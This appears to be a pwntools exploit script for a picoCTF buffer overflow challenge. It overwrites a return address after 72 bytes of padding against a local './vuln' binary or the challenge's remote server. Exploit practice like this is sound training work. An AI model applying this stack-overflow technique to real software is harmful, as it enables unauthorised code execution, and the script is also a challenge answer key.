from pwn import *
import sys

is_debug = False
gdbscript = f'''
    init-pwndbg
    b main
    continue
    '''.format(**locals())

def dealing_with_arguments():
    if len(sys.argv) > 1:
        if sys.argv[1].lower() == "remote":
            return remote('saturn.picoctf.net', 54100)

        elif sys.argv[1].lower() == "gdb":
            return gdb.debug([program], gdbscript=gdbscript)
            # io = elf.process()
            # is_debug = True
    else:
        return elf.process()

# Set up pwntools for the correct architecture
program = './vuln'
elf = context.binary = ELF(program)
context.log_level = 'debug'

# Determine local vs remote
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = dealing_with_arguments()
padding = 72

payload = flat(
    b'A' * padding,
    p64(0x000000000040123b),
    # b'\n'
)
# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
print(io.recvall().decode())